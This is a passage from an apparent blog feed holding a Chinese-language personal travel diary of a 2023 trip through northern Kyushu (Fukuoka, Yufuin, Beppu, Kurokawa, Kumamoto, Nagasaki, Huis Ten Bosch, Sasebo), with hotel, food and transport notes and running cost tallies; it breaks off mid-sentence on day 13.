28k。每人平均一天花費為 5000 台幣左右，以出國來說應該算還行？</p><p>看了一下跟團價格，機票加住宿一個人也大概是 12k~14k 左右，似乎也相差不遠，不過還是自由行比較彈性一點。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 日本北九州 19 天 18 夜遊記之九州怎麼這麼大</title>
      <link href="/2023/05/26/2023-jp-travel-eed64a0cb3a0/"/>
      <url>/2023/05/26/2023-jp-travel-eed64a0cb3a0/</url>
      
        <content type="html"><![CDATA[<p>原本其實懶得寫遊記，但玩一玩想說這次也去了不少地方，寫篇文章記錄一下也不錯。文章基本上會是我最愛的流水帳體，紀錄每一天去了哪裡，順便記一下花了多少錢。</p><p>原本想說都去了快三週，把整個九州玩一圈應該很輕鬆吧，準備行程時查了資料才發現九州超級大，就算是三週也玩不完，因此這次只專注在北九州。排行程的原則是不想要一天裡面跑來跑去，所以盡量在每個點停個一兩天。</p><p>為了方便，日幣匯率都先以 0.23 來算。</p><p>時間：2023&#x2F;05&#x2F;08 ~ 2023&#x2F;05&#x2F;26<br>人數：2，我跟我太太</p><p>底下先附上這次旅程的大概地圖：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__LZ9vr3T1buKxcLirIudtvw.png"></p><h3 id="5-月-8-日-Day1：桃園機場-福岡"><a href="#5-月-8-日-Day1：桃園機場-福岡" class="headerlink" title="5 月 8 日 Day1：桃園機場 &#x3D;&gt; 福岡"></a>5 月 8 日 Day1：桃園機場 &#x3D;&gt; 福岡</h3><p>這次我們搭的是星宇航空的 JX840，雖然說星宇負面消息不斷，但買機票的時候正好搭上辦信用卡送折價券的活動，再加上我的星宇會員今年需要搭三次才能保持會籍，所以還是選擇了星宇，經濟艙折扣下來 11558 元。</p><p>飛機是早上 8 點出發，因此 5 點就用了匯豐旅人卡的機場接送前往機場，順利報到以後就進貴賓室吃吃喝喝（我有星宇 Lv2 的會員卡，用之前拿到的 JGC match 來的），星宇貴賓室的招牌餐點雖然是阜杭豆漿，但我上次吃過沒有很喜歡，反而更喜歡拉麵跟其他自助式餐點，尤其是甜點。</p><p>吃完以後就去等登機了，而這次的閘門是需要先搭車的那種，雖然說有會員所以可以優先登機，但也只是先進去公車上吹冷氣（超爆幹冷），還是要等整車都到齊以後才會一起發車。</p><p>因為公車是一直等到表定登機時間的前十分鐘才發車，所以我想說車上就是全部的人了，大概才三四十個，想說「哇真好，人真少」。結果上飛機以後等了大概十幾分鐘，座艙長來打招呼的時候才順便說因為要等另一團旅客所以還沒飛，等到了的時候發現超大團，整個飛機都快被坐滿，看來人還是很多的。</p><p>星宇飛福岡的機型是 A321neo，只有一排走道的飛機，如果要在送餐或是收餐時間上廁所的話請三思。像我一樣坐在前排的話，需要不少時間跨越三台餐車以後才能走到最後面的廁所。</p><p>下飛機過移民官時本來已經有預期心理會排很久，但似乎同時間沒有其他班機，而我們座位又在前面，所以大概十幾分鐘就過了。而行李的話靠著優先行李外加不知道為什麼特別有效率，我上個廁所出來就看到行李也出來了。</p><p>接著搭接駁公車到國內線然後轉地鐵前往博多車站（話說這邊其實搭公車會更快，但我上次到福岡是搭國內線所以沒這步驟，因此這次忘記有這回事），順利抵達飯店。</p><p>這次入住的飯店是這間：<a href="https://www.google.com/travel/search?q=%E5%8D%9A%E5%A4%9A%E6%96%B0%E5%B9%B9%E7%B7%9A%E5%8F%A3%E6%B0%B8%E5%AE%89%E5%9C%8B%E9%9A%9B%E5%A4%A7%E9%85%92%E5%BA%97&g2lb=2502548,2503771,2503781,4258168,4270442,4284970,4291517,4306835,4308227,4597339,4757164,4814050,4850738,4864715,4874190,4886480,4893075,4920132,4924070,4965990,4985711,4988904,4989886,4990494,72253158,72256471&hl=zh-Hant-JP&gl=jp&ssta=1&ts=CAESABocEhoSFAoHCOcPEAYYDBIHCOcPEAYYDRgBMgIQACoHCgU6A0pQWQ&qs=CAEyFENnc0lfZWJWN01HRzdPS2pBUkFCOAlCCwl9c5UdNLDFoxgBQgsJPqdJtGO4kXgYAQ&ap=aAG6AQhvdmVydmlldw&ictx=1&sa=X&ved=0CAAQ5JsGahcKEwjg9Oa17oX_AhUAAAAAHQAAAAAQCg&utm_campaign=sharing&utm_medium=link_btn&utm_source=htls">博多新幹線口永安國際大酒店</a>，兩個晚上加起來約 3600 台幣，地點離博多車站滿近的。接著就是到處去晃晃，晚上跟朋友吃飯，結束了第一天。</p><p>晚餐吃的是這個：<a href="https://goo.gl/maps/rmEDD1WRQZGynPEz5?coh=178573&entry=tt">水炊料亭 博多華味鳥</a>，一個人大約 5000 日幣，味道不錯但價格確實偏高，有試過一次就好。</p><p>累積交通費用：0 （太小的那種先不計好了，然後機票先不加）<br>累積住宿費用：3600 元<br>累積食物費用：2300 元</p><h3 id="5-月-9-日-Day2：繼續待在福岡"><a href="#5-月-9-日-Day2：繼續待在福岡" class="headerlink" title="5 月 9 日 Day2：繼續待在福岡"></a>5 月 9 日 Day2：繼續待在福岡</h3><p>這天就是排福岡市區隨意晃，早上先在車站的百貨公司逛逛，中午跑去吃了<a href="https://goo.gl/maps/BZxNU4YtHB72EPH2A?coh=178573&entry=tt">一幸舍博多本店</a>，道地的豚骨拉麵，然後不得不說豚骨拉麵真的是滿臭的，遠遠就能聞到那個味道，或許外國人聞臭豆腐可能也是類似的感覺吧？</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__fd93HCLHkMNT4MJIZyR6uw.jpeg"></p><p>下午跑去 Lalaport 逛，主要是來看這尊鋼彈的，我覺得比之前在東京台場看的還要帥氣許多，定時會有一些表演讓它稍微動一下，但我覺得不動就已經很帥了：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__mIDVNauPt__0YL8au2c4kxA.jpeg"></p><p>裡面其實滿大滿好逛的，然後有一個鋼彈專賣店可以逛，除了賣鋼彈以外也有展示很多鋼彈，但水星的魔女裡面出現的風靈已經賣完了，看來是真的賣得很好，連專賣店都賣完了。</p><p>逛到晚上直接在那邊吃晚餐，晚餐吃了這個<a href="https://goo.gl/maps/4f21Etu2nL58X7BZ6?coh=178573&entry=tt">宍道湖しじみ中華蕎麦 琥珀 ららぽーと福岡店</a>，味道不錯但有點偏鹹（日本大部分拉麵似乎都這樣），價格也是 1000 日幣左右。</p><p>累積交通費用：460 元（今天加昨天搭公車跟地鐵算起來應該要個 1000 日幣，兩個人就是 460 台幣了）<br>累積住宿費用：3600 元<br>累積食物費用：3220 元（2300 + 460*2）</p><h3 id="5-月-10日-Day3：福岡博多-由布院"><a href="#5-月-10日-Day3：福岡博多-由布院" class="headerlink" title="5 月 10日 Day3：福岡博多 &#x3D;&gt; 由布院"></a>5 月 10日 Day3：福岡博多 &#x3D;&gt; 由布院</h3><p>飯店是早上 10 點退房，已經訂好下午兩點半的由布院之森五號，所以還有一些時間需要打發。</p><p>這次沒有買 JR pass，理由是我稍微算過之後發現應該不會便宜太多，畢竟這次我每個點都會停留一下，而不是一般人那種來個一週的玩法（到處跑），所以 JR pass 不一定比較便宜，而且還要排隊換票跟劃位之類的。</p><p>有些需要預定的車票我都是先在網路上弄好，比如說這次的由布院之森就是，但突發狀況是我以為可以用自動取票機，操作之後他卻叫我找真人，所以還是去排了真人的櫃檯。</p><p>這天中午吃的是朋友推薦的<a href="https://goo.gl/maps/5cLgSxg1PtzUxn3C8?coh=178573&entry=tt">天麩羅処ひらお 大名店</a>，所有天婦羅都是現點現炸的，大概等了半小時左右才入座，價格的部分也是一人 1000 日幣左右，我自己覺得還滿好吃的，而且價格實惠，沒排隊的話可以來。</p><p>接著下午就跑回博多搭車了，兩個人的車資約為 10000 日幣，真的不便宜。至於由布院之森嘛，就是台觀光列車，我自己沒有特別喜歡，就覺得裝潢滿復古的，途中有經過一些景點的話會特別跟你說，不過大部分時間的風景都是田園風光就是了。</p><p>到達由布院時已經快要下午五點了，直接步行前往這次的住宿：<a href="https://goo.gl/maps/Vo2BXwUmLWv9kEJC8?coh=178573&entry=tt">由布院風の森</a>，是這趟旅程中最貴的住宿，一泊二食的價格為 13000 元台幣。</p><p>這個住宿住的是那種日式傳統飯店，而且很大，除了睡的地方還有個客廳，泡澡的話有室內跟室外，都是獨立湯屋。雖然說整個飯店小小的但很有氣氛，可以理解這個價格。</p><p>晚餐跟早餐都是獨立的包廂，只有我們兩個人而已，整個地方很有氣氛然後吃的也不錯，我覺得是適合來度假的地方。</p><p>累積交通費用：2760 元（460 + 2300）<br>累積住宿費用：16600 元（3600 + 13000）<br>累積食物費用：3680 元（3220 + 460）</p><h3 id="5-月-11日-Day4：由布院一日遊"><a href="#5-月-11日-Day4：由布院一日遊" class="headerlink" title="5 月 11日 Day4：由布院一日遊"></a>5 月 11日 Day4：由布院一日遊</h3><p>吃完早餐後退房，先跑去今天要住的另一個飯店<a href="https://goo.gl/maps/g29i2ixvFu3j9NwK7?coh=178573&entry=tt">湯布院如歸旅館</a>放行李，兩間旅館的位置不遠，走路大概 5 分鐘就可以到。會換飯店是因為預算考量，覺得一泊二食的高檔飯店住一天就夠了，另一天隨意住就好。</p><p>這邊住一個晚上的價格是 3400 元。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__ZfC92VO0eoC7fivTORjpsQ.jpeg"></p><p>放完行李之後用走的走到金鱗湖然後再逛回由布院車站，金鱗湖比想像中的小滿多的，之前看到的著名景點水上鳥居的尺寸也相當迷你。</p><p>吃的部分在逛的時候沿路買了不少，像是炸雞啦，糰子啦，或是一些其他的點心，價格部分抓個 2500 日幣好了。我自己是覺得由布院還算滿好逛的，路上有許多小吃（而且看起來都滿好吃的）。</p><p>逛完之後也差不多到了飯店的入住時間，就跑回去休息。</p><p>晚餐的話五點多跑去吃大名鼎鼎的由<a href="https://goo.gl/maps/MqW5cKpEfrbeGSrA7?coh=178573&entry=tt">布麻布「心」由布院站前店</a>，這時間不用排隊直接進去，點了地雞的，不得不說它的釜飯是真的很香，配著他給的醬料跟小菜一起吃也很香很下飯，不過價格確實是偏高，一個人 2650 日幣，換成台幣是 600 塊，但如果有機會的話我會想再去一次然後點牛的。</p><p>累積交通費用：2760 元<br>累積住宿費用：20000 元（16600 + 3400）<br>累積食物費用：4950 元（3680 + 1270）</p><h3 id="5-月-12日-Day5：由布院-別府"><a href="#5-月-12日-Day5：由布院-別府" class="headerlink" title="5 月 12日 Day5：由布院 &#x3D;&gt; 別府"></a>5 月 12日 Day5：由布院 &#x3D;&gt; 別府</h3><p>早上退房以後就去公車站等公車，搭乘 36 號公車前往別府，一個人是 940 日幣，路程大約一個小時左右。路上的風景滿不錯的，看了心情很好：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__ZWLcs6X3y1bufOmQx3H34g.jpeg"></p><p>只是我們拿了兩個大行李箱，其實搭公車不太方便，當時在規劃行程時沒想到這個，以後要記著。</p><p>到了別府以後先去飯店放行李，住的是車站附近的<a href="https://goo.gl/maps/yteXgQ4w8rfeRnqz8?coh=178573&entry=tt">別府第一飯店</a>，兩個晚上 5000 塊台幣。原本想說在別府逛一下，但別府比我想的更荒涼一點，索性直接搭車到大分去看看。搭車大概 20 分鐘左右會到，車資 280 日幣。</p><p>大分車站附近就是一整條商店街可以逛，透過 Google Maps 找到了這間 CP 值超高的餐廳：<a href="https://goo.gl/maps/gBJmJ2uWAntjb4ZEA?coh=178573&entry=tt">あんとれ</a></p><p>要猜猜看底下這個豬排加漢堡排加沙拉加白飯多少錢嗎？</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__KBAOm1aKeeqBM__sxhYlKvQ.jpeg"></p><p>答案是 790 日幣，換算台幣為 180 塊。兩個人吃得超飽，份量有點太多了。</p><p>吃完以後去逛附近的遊樂場，玩了不少夾娃娃機但一個都沒夾到。逛到時間差不多以後再搭車回別府，回飯店休息。</p><p>晚上的話因為不小心睡到太晚又懶得走太遠，直接買超市食物當作晚餐，兩個人算個 1500 日幣好了。</p><p>累積交通費用：3460 元（2760 + 700）<br>累積住宿費用：25000 元（20000 + 5000）<br>累積食物費用：5660 元（4950 + 360 + 350）</p><h3 id="5-月-13日-Day6：別府地獄溫泉巡禮"><a href="#5-月-13日-Day6：別府地獄溫泉巡禮" class="headerlink" title="5 月 13日 Day6：別府地獄溫泉巡禮"></a>5 月 13日 Day6：別府地獄溫泉巡禮</h3><p>別府最著名的觀光景點就是地獄溫泉了，但很遺憾這天早上就開始下雨，而且氣象預報說會下一整天，所以整天的行程都是在雨中進行的。</p><p>早上先去車站買公車一日券外加地獄組合套票，一個人 3000 日幣。接著就搭公車前往第一站：海地獄。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__ik45MWFQ4m0Ma0c2Dz7Mjw.jpeg"></p><p>要注意的是雖然有買地獄組合套票，但到了海地獄以後要先把車站賣的那個換成真的票券，沒辦法直接用車站買的那個。</p><p>海地獄附近有其他幾個地獄，每個其實都不大但都可以去參觀一下，都是滿特殊的景觀，像底下這個血之地獄：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__Gztpk8HumDOdydUWPVsMMg.jpeg"></p><p>我們把所有地獄都逛過一遍，最失望的應該是間歇泉龍捲地獄，原本以為會很壯觀結果沒有，因為噴發間隔大約要半小時，建議到了之後先去問時間，再依據狀況看是要等還是要先去旁邊的其他地獄參觀。</p><p>總而言之呢，我覺得地獄巡禮值得一來，但要注意好公車時間，畢竟有些一班就要等半個小時，算好時間逛完剛好搭公車會方便很多。</p><p>逛完大概是 12:30，決定直接搭公車去吃一直很想吃的午餐：<a href="https://goo.gl/maps/EV2MSfF5Q5Tk6k6K6?coh=178573&entry=tt">天丼 とよ常本店</a>，下午兩點左右抵達（不知道為什麼滿塞的），還是人潮滿滿，等了大概二十分鐘左右才入座。</p><p>它的天丼長這樣，除了蝦子本身以外還有薄薄的一層不知道什麼東西：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__nHMye____D7WSSN44BhUQuRg.jpeg"></p><p>兩隻蝦子的大概是一千日幣左右，我點了四隻，兩個人加起來大概 2600 日幣，超級好吃，是這次吃到的天婦羅裡面最厲害的。無論是蝦子本身的肉質還是那個皮都很好吃。</p><p>吃完之後還在下雨，在附近百貨公司逛一下之後就回飯店睡覺了。</p><p>晚上則是隨便吃了飯店附近的居酒屋：<a href="https://goo.gl/maps/CvcWc9gsXmtEZUSB8?coh=178573&entry=tt">ならび屋</a>，點了招牌的番茄麵、炸雞、小菜蒟蒻豆腐、炸牡蠣跟飲料，忘記多少錢了，先抓個 2500 日幣好了。</p><p>累積交通費用：3920 元（3460 + 460）<br>累積住宿費用：25000 元<br>累積食物費用：6860 元（5660 + 1200）<br>累積娛樂費用：920 元</p><h3 id="5-月-14日-Day7：別府-黑川溫泉"><a href="#5-月-14日-Day7：別府-黑川溫泉" class="headerlink" title="5 月 14日 Day7：別府 &#x3D;&gt; 黑川溫泉"></a>5 月 14日 Day7：別府 &#x3D;&gt; 黑川溫泉</h3><p>今天的重頭戲是要去黑川溫泉，一個沒那麼容易抵達的地方。</p><p>早上退房才十點，離要搭車的十二點還有一段時間，去了昨天晚上才查到的<a href="https://goo.gl/maps/PfG1SMzAaCbd7naAA?coh=178573&entry=tt">世界之塔</a>，門票很便宜一人才 300 日幣而已，很推薦這邊：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__qaaGL9RZh2kPOQ4Y1cYntQ.jpeg"></p><p>午餐直接吃了附近的<a href="https://goo.gl/maps/UyErXLyis1tsUHTY9?coh=178573&entry=tt">台湾料理鑫成</a>，不過無論是菜色、店內還是店員，都沒有台灣的味道。但是料理本身還是挺不錯的，便宜又好吃，口味有點偏重，兩個人加起來大概才 1500 日幣，可以吃到海鮮炒青菜、拉麵以及炒飯。</p><p>吃完之後到車站搭了公車回由布院，因為要接之後的九州橫斷巴士到黑川溫泉。車資是一個人 2200 日幣，需要搭一個半小時的車。</p><p>抵達黑川溫泉時是下午三點半，用走的大概五分鐘就到了本日住宿：<a href="https://goo.gl/maps/HLVGfVWUgw8YxQgZA?coh=178573&entry=tt">湯峽の響き 優彩</a>，價格是 7800 台幣一泊二食。會住這間的原因很簡單，因為決定去黑川溫泉時訂房網站只剩下這間可以訂了，沒什麼其他選擇，但入住以後覺得這間滿不錯的，可以推薦給其他人。</p><p>房間一樣是有榻榻米的和室，然後陽台一看出去就是一條小溪，拍起來像這樣：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__Olwzsa6UQ9U3N__gyizbdmQ.jpeg"></p><p>可以聽到潺潺流水聲，整個感覺很不錯。</p><p>泡湯的部分有大眾池跟私人湯屋，私人湯屋大概兩間，不用預約，先到先贏。我想說四五點先去洗好了，沒想到裡面居然有人，等了大概二十幾分鐘。</p><p>洗完澡去吃飯，它的餐廳是自助餐，除了我們以外都是年紀偏大的，菜色很多樣而且味道不錯，滿推的。吃完之後經過私人湯屋看了一下，發現都是空的，學到了新知識：好像不少日本人在溫泉旅館都習慣洗完澡再去吃飯。下次會選擇先吃完飯再去洗澡，應該就不用排了。</p><p>話說一開始進房間的時候發現沒鋪床，以為要自己鋪就自己亂弄了一下，吃完飯回來發現房間被整理過了，才想起來原來很多溫泉旅館是在你吃飯的時候會來幫你鋪床。</p><p>晚上睡覺的時候本來想要開著窗戶聽著潺潺流水聲入睡，但是太冷了，只好把窗戶關起來。</p><p>累積交通費用：5370 元（3920 + 1450）<br>累積住宿費用：32800 元（25000 + 7800）<br>累積食物費用：7200 元（6860 + 340）<br>累積娛樂費用：1060 元（920 + 140）</p><h3 id="5-月-15日-Day8：黑川溫泉-熊本"><a href="#5-月-15日-Day8：黑川溫泉-熊本" class="headerlink" title="5 月 15日 Day8：黑川溫泉 &#x3D;&gt; 熊本"></a>5 月 15日 Day8：黑川溫泉 &#x3D;&gt; 熊本</h3><p>結束了很放鬆的一天之後再度啟程，一樣是搭九州橫斷巴士直接前往熊本，車程要兩個半小時，車資是 2800 日幣一個人。</p><p>早上十點半搭的車，一直到下午一點才抵達熊本。到熊本之後剛好住的地方跟巴士站滿近的，走沒多久就到了。這次住的是：<a href="https://goo.gl/maps/RM9Xwucp3AkFYgko9?coh=178573&entry=tt">熊本三井花園飯店</a>，兩個晚上 3500 台幣。</p><p>放完行李大概快兩點，想說這時候去吃<a href="https://goo.gl/maps/T6x3zwdjPzCU2FVY8?coh=178573&entry=tt">勝烈亭</a>本店應該沒人了吧，殊不知人還是超多，前面要等 30 幾個人…，果斷放棄去吃就在附近轉角的<a href="https://goo.gl/maps/srFyy65w7jccCHfw6?coh=178573&entry=tt">手打烏龍麵.蕎麥麵居酒屋 ふく泉</a>，點了馬肉加牛肉的烏龍麵組合外加一個地雞，地雞是真的不好吃很難咬，馬肉的話沒跟我講我還吃不太出來。</p><p>價格的話加起來兩碗麵再加那個地雞差不多也是 2000 日幣左右。</p><p>吃完繼續逛街，逛累了回飯店休息睡覺，起床以後六點多跑去吃勝烈亭發現晚上人好少，都不用排隊。點了一般的豬排 + 炸蝦套餐，味道不錯但不到驚艷，兩個人合計約 4000 日幣。</p><p>如果下次還有機會路過而且不用排隊，可以試試看更高級的。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__SredhjC84M3ABUBePJ1pWQ.jpeg"></p><p>累積交通費用：6670 元（5370 + 1300）<br>累積住宿費用：36300 元（32800 + 3500）<br>累積食物費用：8580 元（7200 + 1380）<br>累積娛樂費用：1060 元</p><h3 id="5-月-16日-Day9：熊本一日遊"><a href="#5-月-16日-Day9：熊本一日遊" class="headerlink" title="5 月 16日 Day9：熊本一日遊"></a>5 月 16日 Day9：熊本一日遊</h3><p>早上 11 點直接先殺到熊本站，去<a href="https://goo.gl/maps/8CTaw3vaKCmiRXSY9?coh=178573&entry=tt">菅乃屋熊本駅店</a>吃中午的馬肉套餐，兩個人的價格為 5000 日幣，心得還是一樣五個字：「吃牛肉就好」。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__rm2QyFnaE2NB7iIQwfnQLQ.jpeg"></p><p>吃完以後繼續逛逛，逛完就搭路面電車到熊本城，這天的天氣超熱，很不建議在大熱天去逛這種城池，會被太陽曬死。</p><p>然後熊本城真的滿壯觀的，參觀的時候也看了不少相關的故事，看完之後會讓人更想了解這段日本的歷史，也是一個我會推薦的景點。參觀門票為一個人 850 日幣。</p><p>晚餐的話因為在熊本城附近有先隨便吃過一些小吃了，所以不太餓，最後是吃超市食物配之前買的泡麵，算個 500 日幣好了。</p><p>累積交通費用：6870 元（6670 + 200）<br>累積住宿費用：36300 元<br>累積食物費用：9850 元（8580 + 1270）<br>累積娛樂費用：1460 元（1060 + 400）</p><h3 id="5-月-17日-Day10：熊本-長崎"><a href="#5-月-17日-Day10：熊本-長崎" class="headerlink" title="5 月 17日 Day10：熊本 &#x3D;&gt; 長崎"></a>5 月 17日 Day10：熊本 &#x3D;&gt; 長崎</h3><p>早上先去公車站附近覓食，隨便吃了美食街的拉麵，非常不怎麼樣。兩個人大約也是 2000 日幣左右。</p><p>一般常見從熊本到長崎的方式都是搭 JR 繞一圈，但我查到另一種是直接搭船然後再接電車，這樣的交通費用大約是一個人 3000 日幣左右。</p><p>不過時間要算好，因為到港口的公車也是那種一小時一班的，算好時間就沒問題，從熊本市區到港口大概要 40 分鐘左右，其實也不算近。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__7qw7cvgvTijpYxw06w97__w.jpeg"></p><p>這種船是車子也可以開上來的，我們剛好碰到有一團是那種畢業旅行吧，整個遊覽車開上來然後船上就充滿一堆青春洋溢的國中生。</p><p>航程大概 30 分鐘而已，很快就到長崎了。</p><p>到長崎以後走個五分鐘就可以到車站，車廂只有一節而已：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__NeDGntn__0ywZjzbZgOZgJA.jpeg"></p><p>這種車是不收電子票卷的，只能用現金支付，所以記得要準備好現金。</p><p>要搭一個半小時左右才會到 JR 長崎站，沿途風光明媚，有些站就在海旁邊而已，滿漂亮的：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__qgkDaU5eWqG8mY9GOvYzEg.jpeg"></p><p>附一下時間：</p><ul><li>12:00 熊本公車站出發</li><li>12:40 抵達港口</li><li>13:00 開船</li><li>13:30 抵達長崎島原港</li><li>14:04 列車進站，出發</li><li>15:40 抵達長崎車站</li></ul><p>因此大概是花了三個半小時左右，才從熊本市區抵達長崎市區。</p><p>在長崎的飯店住的是這間：<a href="https://goo.gl/maps/W4FsmYU49K7GUttp7?coh=178573&entry=tt">長崎出島麗景飯店</a>，離長崎站走路約 15 分鐘，搭路面電車的話比較快但有行李不太方便，價格則是兩晚 6000 台幣。</p><p>check-in 以後休息一下就出門覓食，在 Google Maps 找到了一間看起來不錯的拉麵店：<a href="https://goo.gl/maps/G6D47oigSLNohjk68?coh=178573&entry=tt">拉麵柊 本店</a>，主打的是番茄拉麵：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__pvXziaM3__gROeDtUcdVCxA.jpeg"></p><p>超、級、好、吃，這是我吃過最好吃的茄子，因為是烤過的所以有點焦香味，我很愛那種味道，然後蕃茄湯底是偏濃厚的那種，很有味道而且好喝。</p><p>這是我這趟旅程中吃到最合我胃口最好吃的東西。</p><p>價格的話一樣是兩個人約 2000 日幣。</p><p>吃完之後去附近的中華街走走，比想像中的還要小，剛好有不少學生在那邊，應該也是畢業旅行之類的。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__rriwdAOyULennpDgZ1pdSQ.jpeg"></p><p>最後則是去海濱公園晃晃，結束這一天。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__X0qmwESkVwSyxW3uHCh8Eg.jpeg"></p><p>累積交通費用：8250 元（6870 + 1380）<br>累積住宿費用：42300 元（36300 + 6000）<br>累積食物費用：10770 元（9850 + 920）<br>累積娛樂費用：1460 元</p><h3 id="5-月-18日-Day11：長崎一日遊"><a href="#5-月-18日-Day11：長崎一日遊" class="headerlink" title="5 月 18日 Day11：長崎一日遊"></a>5 月 18日 Day11：長崎一日遊</h3><p>這天從早上開始就在下雨，完全破壞了出門的心情，索性就不出門了。</p><p>中午吃 Uber eats 點的餃子的王將，味道比想像中好滿多的（之前在新加坡還是台灣吃過，覺得不怎麼樣），點了炒飯 + 糖醋排骨 + 回鍋肉，一共是 3300 日幣。</p><p>晚餐的話雨比較小了一點，直接吃飯店附近的餐廳<a href="https://goo.gl/maps/2VqfDyeia5VSasnV6?coh=178573&entry=tt">強棒麵 江戸びし</a>，價格也是兩人大概 2000 日幣。吃完去附近的商店街走了一下，就結束了這一天。</p><p>原本想去的原爆資料館跟稻佐山夜景就留給下次吧。</p><p>累積交通費用：8250 元<br>累積住宿費用：42300 元<br>累積食物費用：11980 元（10770 + 1210）<br>累積娛樂費用：1460 元</p><h3 id="5-月-19日-Day12：長崎-豪斯登堡"><a href="#5-月-19日-Day12：長崎-豪斯登堡" class="headerlink" title="5 月 19日 Day12：長崎 &#x3D;&gt; 豪斯登堡"></a>5 月 19日 Day12：長崎 &#x3D;&gt; 豪斯登堡</h3><p>從長崎搭電車到豪斯登堡，車程約一個半小時，車資一人為 1500 日幣。要注意的是豪斯登堡車站沒有 IC 卡的出口，所以記得先買好票或是出站時付現金。</p><p>大概是中午 12 點左右抵達，這次住的是<a href="https://goo.gl/maps/SsdU7T2WXkSErkhq7?coh=178573&entry=tt">豪斯登堡日航酒店</a>，一晚為 5800 元，飯店很大而且離遊樂院很近，沒記錯的話房價也比其他幾間便宜，滿推薦的。</p><p>豪斯登堡的門票一個人是 7000 日幣。</p><p>放完行李之後就去豪斯登堡裡面玩了，午餐的話吃了裡面最熱門的餐廳，一個吃披薩的，聞起來比吃起來好吃（真的很香），兩個人 3500 日幣。</p><p>然後就在裡面到處晃晃順便玩一些遊樂設施。豪斯登堡裡面的遊樂設施只有旋轉木馬跟摩天輪是傳統意義上的遊樂設施，其他都是那種 VR 遊戲居多，老實說 VR 遊戲玩第一次覺得滿好玩，第二次就開始覺得滿假的了。現在 VR 的最大缺陷應該還是畫質不夠高，所以看起來假假的。</p><p>豪斯登堡去之前以為很大，去之後發現好像沒有想像中大，覺得大阪環球影城應該更大一些？遊樂設施也都是不太刺激的那種，比起遊樂園倒是比較像一個巨大的花園。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__ePn4WVIKBnymwvaHn7S9cg.jpeg"></p><p>晚餐的話太晚想到，六點半左右每個餐廳都在排隊了，所以只好隨便吃一個沒人排的咖啡廳，兩個人 2300 日幣，點了一個義大利麵跟香腸拼盤。</p><p>我自己如果下次再去的話一定會挑晚上去，直接買星光票就好，因為晚上是真的很漂亮。如果你想要玩的是那種比較刺激的遊樂設施，這邊沒有，所以我也會推薦晚上再來就好。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__uPb0iImu3I1Ia44f5FeYoA.jpeg"></p><p>累積交通費用：8950 元（8250 + 700）<br>累積住宿費用：48100 元（42300 + 5800）<br>累積食物費用：13320 元（11980 + 1340）<br>累積娛樂費用：4680 元（1460 + 3220）</p><h3 id="5-月-20日-Day13：豪斯登堡-佐世保"><a href="#5-月-20日-Day13：豪斯登堡-佐世保" class="headerlink" title="5 月 20日 Day13：豪斯登堡 &#x3D;&gt; 佐世保"></a>5 月 20日 Day13：豪斯登堡 &#x3D;&gt; 佐世保</h3><p>從豪斯登堡可以直接搭公車到佐世保車站，票價大約是一個人 500 日幣左右。</p><p>在佐世保的住宿為 <a href="https://goo.gl/maps/9GZb7oq9P9pf8uF38?coh=178573&entry=tt">Hotel Resol Sasebo</a>，一個晚上 2600 台幣。離車站很近，過個馬路就到了。離公車站更近，旁邊就是了。</p><p>放完行李先去車站吃鼎鼎大名的佐世保漢堡，就在車站後面的 <a href="https://goo.gl/maps/oZRdv36affFXvQir9?coh=178573&entry=tt">HIKARI 漢堡</a>，單點一個招牌漢堡的價格大概為 800 日幣左右，兩個人再點個薯條飲料大約 2000 日幣。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1____DNeQUXGonD3CL9NK9IQ5Q.jpeg"></p><p>漢堡是好吃的，雖然有些人覺得外觀像是早餐店漢堡，但比早餐店漢堡好吃很多。不過也沒辦法準確說出哪一個部分好吃，或許是味道很多樣？有生菜、醬汁、起司、番茄、蛋跟肉排全部集中在一口。</p><p>吃完之後去附近百貨公司晃了一下，偶然看到新世紀福音戰士的周邊店面：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__en72uRGZWkGUTYz3nnUMSA.jpeg"></p><p>逛完之後搭公車去九十九島乘船的地方，票價為一個人 1500 日幣，搭上了會開一個小時的觀光船：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__jq__luCZKWuobYqvdi9HksA.jpeg"></p><p>我本來滿期待這個船的，但去了之後有點小失望。原因大概是我覺得九十九島可能要再高一點的地方鳥瞰會比較好看，近距離靠近的話反而沒什麼美的角度。而且一小時其實有點久，景觀都差不多看到後面滿膩的，就坐在船裡面休息了。</p><p>下船以後去隔壁的水族館，雖然說水族館小小的但我覺得滿值得來，一來是海豚表演很厲害，二來是有一區都是水母的超帥，有各種大小的水母，有些還會發出像是電競般的光芒。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__XbHOHn0NDV5U__qfGxN5f8Q.jpeg"></p><p>水族館的票價為一個人 1260 日幣，有搭九十九島的觀光船的話出示船票會有折扣。</p><p>看完之後就搭公車回市區了，稍作休息之後再度前往另一個知名的漢堡店：<a href="https://goo.gl/maps/WYk3nF26NzKrUC6q6?coh=178573&entry=tt">佐世保漢堡 BigMan 上京町總店</a>，這間的價格比較高，點了兩個漢堡 + 薯條 + 飲料大概要 3000 